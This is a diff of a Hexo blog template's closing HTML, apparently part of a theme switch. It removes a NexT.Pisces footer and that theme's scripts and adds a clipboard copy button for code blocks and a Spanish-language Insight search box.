+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <style>
+        .hljs {
+            position: relative;
+        }
+
+        .hljs .clipboard-btn {
+            float: right;
+            color: #9a9a9a;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .hljs .clipboard-btn:hover {
+          color: #8a8a8a;
+        }
+
+        .hljs > .clipboard-btn {
+            display: none;
+            position: absolute;
+            right: 4px;
+            top: 4px;
+        }
+
+        .hljs:hover > .clipboard-btn {
+            display: inline;
+        }
+
+        .hljs > figcaption > .clipboard-btn {
+            margin-right: 4px;
+        }
+    </style>
+    <script>
+      $(document).ready(function () {
+        $('figure.hljs').each(function(i, figure) {
+          var codeId = 'code-' + i;
+          var code = figure.querySelector('.code');
+          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
+          code.id = codeId;
+          copyButton.addClass('clipboard-btn');
+          copyButton.attr('data-clipboard-target-id', codeId);
+
+          var figcaption = figure.querySelector('figcaption');
+
+          if (figcaption) {
+            figcaption.append(copyButton[0]);
+          } else {
+            figure.prepend(copyButton[0]);
+          }
+        })
+
+        var clipboard = new ClipboardJS('.clipboard-btn', {
+          target: function(trigger) {
+            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+          }
+        });
+        clipboard.on('success', function(e) {
+          e.clearSelection();
+        })
+      })
+    </script>
+
+    
+
+
+<script src="/js/script.js"></script>
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-mask"></div>
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="Escribe algo...">
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
         </div>
-      </div>
-
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
     </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
-
-
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
-  <span class="with-love" id="animate">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">Threezh1</span>
 </div>
-  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
-  <span class="post-meta-divider">|</span>
-  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.3.0</div>
-
-        
-
-
-
-
-
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: 'Posts',
+                PAGES: 'Páginas',
+                CATEGORIES: 'Categorías',
+                TAGS: 'Tags',
+                UNTITLED: '(Sin título)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js"></script>
     
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-
-  </div>
-
-  
-  <script src="/lib/jquery/index.js?v=3.4.1"></script>
-  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-<script src="/js/utils.js?v=7.3.0"></script><script src="/js/motion.js?v=7.3.0"></script>
-<script src="/js/schemes/pisces.js?v=7.3.0"></script>
-<script src="/js/next-boot.js?v=7.3.0"></script>
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-  
-
-  
-
-
-  
-  <script src="/js/post-details.js?v=7.3.0"></script>
-
-
 </body>
 </html>
